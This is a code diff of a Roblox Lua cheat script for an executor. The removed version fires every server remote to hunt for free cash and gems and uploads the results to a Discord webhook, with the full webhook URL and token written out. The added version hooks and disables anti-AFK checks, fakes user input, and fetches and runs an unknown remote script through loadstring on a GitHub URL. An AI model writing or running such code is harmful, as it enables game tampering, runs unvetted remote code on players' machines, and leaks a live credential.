@@ -1,183 +1,116 @@
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local localPlayer = Players.LocalPlayer
 
-local RemoteAnalyzer = {
-    ChangedValues = {},
-    Responded = {},
-    Blocked = {},
-    TimedOut = {}
-}
-
-local TIMEOUT = 5
-local initialCash = 0
-local initialGems = 0
-
-local function isRemote(obj)
-    return obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
-end
-
-local function scanRemotes()
-    local remotes = {}
-    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
-        if isRemote(obj) then
-            table.insert(remotes, obj)
+local function killIdleConnections()
+    for _, connection in pairs(getconnections(localPlayer.Idled)) do
+        connection:Disable()
+    end
+    
+    for _, connection in pairs(getconnections(RunService.Heartbeat)) do
+        local func = connection.Function
+        if func then
+            local info = debug.getinfo(func)
+            if info and info.source then
+                if string.find(info.source, "Idle") or string.find(info.source, "idle") or 
+                   string.find(info.source, "AFK") or string.find(info.source, "afk") then
+                    connection:Disable()
+                end
+            end
         end
     end
-    return remotes
-end
-
-local function getCash()
-    local saveVars = LocalPlayer:FindFirstChild("SaveVars")
-    if saveVars and saveVars:FindFirstChild("Cash") then
-        return saveVars.Cash.Value
-    end
-    return 0
-end
-
-local function getGems()
-    local success, result = pcall(function()
-        return ReplicatedStorage:WaitForChild("Events"):WaitForChild("Data"):WaitForChild("GetAll"):InvokeServer()
-    end)
-    if success and result then
-        return result.Gems or 0
-    end
-    return 0
-end
-
-initialCash = getCash()
-initialGems = getGems()
-print(string.format("Initial - Cash: %d, Gems: %d", initialCash, initialGems))
-
-local function callWithTimeout(remote, timeout)
-    local completed = false
-    local success, result
-    local startTime = os.clock()
     
-    task.spawn(function()
-        if remote:IsA("RemoteFunction") then
-            success, result = pcall(function() return remote:InvokeServer() end)
-        else
-            success, result = pcall(function() remote:FireServer() end)
-        end
-        completed = true
-    end)
-    
-    while not completed do
-        if os.clock() - startTime > timeout then
-            return false, "timeout", os.clock() - startTime
-        end
-        task.wait(0.05)
-    end
-    return success, result, os.clock() - startTime
-end
-
-local function analyzeRemote(remote)
-    local name = remote.Name:lower()
-    if name:find("teleport") or name:find("kick") or name:find("ban") then
-        print(string.format("⏭️ Skipping %s (contains teleport/kick/ban)", remote:GetFullName()))
-        return nil
+    for _, connection in pairs(getconnections(UserInputService.InputEnded)) do
+        connection:Disable()
     end
     
-    local cashBefore = getCash()
-    local gemsBefore = getGems()
-    
-    local success, result, elapsed = callWithTimeout(remote, TIMEOUT)
-    
-    task.wait(0.2)
-    local cashAfter = getCash()
-    local gemsAfter = getGems()
-    
-    local cashChange = cashAfter - cashBefore
-    local gemsChange = gemsAfter - gemsBefore
-    
-    local status = success and "RESPONDED" or "BLOCKED"
-    if elapsed >= TIMEOUT then status = "TIMEOUT" end
-    
-    print(string.format("[%s] %s - %.2fs | Cash: %+d | Gems: %+d", 
-        status, remote:GetFullName(), elapsed, cashChange, gemsChange))
-    
-    local resultData = {
-        Path = remote:GetFullName(),
-        Time = elapsed
+    for _, connection in pairs(getconnections(UserInputService.InputBegan)) do
+        connection:Disable()
+    end
+end
+
+local function blockIdleEvents()
+    local events = {
+        game.ReplicatedStorage:FindFirstChild("Events"),
+        game.ReplicatedStorage:FindFirstChild("Misc"),
+        game.ReplicatedStorage:FindFirstChild("Framework"),
     }
     
-    if elapsed >= TIMEOUT then
-        table.insert(RemoteAnalyzer.TimedOut, resultData)
-    elseif success then
-        resultData.Result = result
-        table.insert(RemoteAnalyzer.Responded, resultData)
-    else
-        table.insert(RemoteAnalyzer.Blocked, resultData)
-    end
-    
-    if cashChange ~= 0 or gemsChange ~= 0 then
-        resultData.CashChange = cashChange
-        resultData.GemsChange = gemsChange
-        table.insert(RemoteAnalyzer.ChangedValues, resultData)
-        print(string.format("   💰 VALUE CHANGE! Cash: %+d, Gems: %+d", cashChange, gemsChange))
+    for _, folder in pairs(events) do
+        if folder then
+            local idleEvent = folder:FindFirstChild("IdleTeleport") or 
+                             folder:FindFirstChild("Idle") or 
+                             folder:FindFirstChild("AFK")
+            if idleEvent and idleEvent:IsA("RemoteEvent") then
+                local oldFire = idleEvent.FireServer
+                idleEvent.FireServer = function() end
+            end
+        end
     end
 end
 
-print("=== STARTING REMOTE AUDIT ===")
-local remotes = scanRemotes()
-print("Found " .. #remotes .. " remotes\n")
-
-for i, remote in ipairs(remotes) do
-    analyzeRemote(remote)
-end
-
-local finalCash = getCash()
-local finalGems = getGems()
-
-print("\n=== RESULTS ===")
-print(string.format("Final Cash: %d (%+d)", finalCash, finalCash - initialCash))
-print(string.format("Final Gems: %d (%+d)", finalGems, finalGems - initialGems))
-print(string.format("Responded: %d | Blocked: %d | Timed Out: %d", 
-    #RemoteAnalyzer.Responded, #RemoteAnalyzer.Blocked, #RemoteAnalyzer.TimedOut))
-
-if #RemoteAnalyzer.ChangedValues > 0 then
-    print("\n💰 REMOTES THAT CHANGED VALUES:")
-    for _, r in ipairs(RemoteAnalyzer.ChangedValues) do
-        print(string.format("  %s - Cash: %+d, Gems: %+d (%.2fs)", 
-            r.Path, r.CashChange, r.GemsChange, r.Time))
+local function hookNetwork()
+    if game.ReplicatedStorage:FindFirstChild("Framework") then
+        local framework = require(game.ReplicatedStorage.Framework.Library)
+        if framework and framework.Network then
+            framework.Network.Fire = function(self, event, ...)
+                if type(event) == "string" and string.find(event, "Idle") then
+                    return nil
+                end
+                return rawget(framework.Network, "Fire")(self, event, ...)
+            end
+        end
     end
 end
 
-local dumpLines = {
-    "REMOTE AUDIT RESULTS",
-    "Initial Cash: "..initialCash,
-    "Initial Gems: "..initialGems,
-    "Final Cash: "..finalCash.." ("..(finalCash - initialCash)..")",
-    "Final Gems: "..finalGems.." ("..(finalGems - initialGems)..")",
-    ""
-}
-
-if #RemoteAnalyzer.ChangedValues > 0 then
-    table.insert(dumpLines, "VALUE CHANGES:")
-    for _, r in ipairs(RemoteAnalyzer.ChangedValues) do
-        table.insert(dumpLines, string.format("%s | Cash: %+d | Gems: %+d | %.2fs", 
-            r.Path, r.CashChange, r.GemsChange, r.Time))
-    end
-end
-
-local function sendToDiscord(content)
-    local webhookUrl = "https://discord.com/api/webhooks/1473934078087528509/V3Bm-RyTV4mlClC5TKQn9gH6BK-ooqsssPw9P13_egipjWwjGoEOAn_7pbfA3TdAIL75"
-    local filename = "remote_audit_" .. os.time() .. ".txt"
-    
-    local boundary = "boundary" .. HttpService:GenerateGUID(false)
-    local body = "--" .. boundary .. "\r\n"
-    body = body .. 'Content-Disposition: form-data; name="file"; filename="' .. filename .. '"\r\n'
-    body = body .. "Content-Type: text/plain\r\n\r\n"
-    body = body .. content .. "\r\n"
-    body = body .. "--" .. boundary .. "--\r\n"
-    
-    pcall(function()
-        request({Url=webhookUrl, Method="POST", Headers={["Content-Type"]="multipart/form-data; boundary="..boundary}, Body=body})
+local function simulateActivity()
+    task.spawn(function()
+        while true do
+            task.wait(30)
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Unknown, false, game)
+            task.wait(0.1)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Unknown, false, game)
+            VirtualInputManager:SendMouseMoveEvent(
+                math.random(100, 900), 
+                math.random(100, 900), 
+                game
+            )
+        end
     end)
-    print("✅ Sent to Discord: " .. filename)
 end
 
-sendToDiscord(table.concat(dumpLines, "\n"))
-print("\n=== AUDIT COMPLETE ===")
+local function scanAndHookFunctions()
+    for _, v in pairs(getgc(true)) do
+        if type(v) == "function" then
+            local info = debug.getinfo(v)
+            if info and info.name then
+                if string.find(info.name, "Idle") or string.find(info.name, "AFK") then
+                    hookfunction(v, function() return nil end)
+                end
+            end
+        end
+    end
+end
+
+-- Load the "no" script directly without cash check
+local function loadNoScript()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/v1"))()
+end
+
+killIdleConnections()
+blockIdleEvents()
+hookNetwork()
+simulateActivity()
+scanAndHookFunctions()
+
+task.spawn(function()
+    while true do
+        task.wait(5)
+        killIdleConnections()
+    end
+end)
+
+-- Load the "no" script once
+task.spawn(loadNoScript)
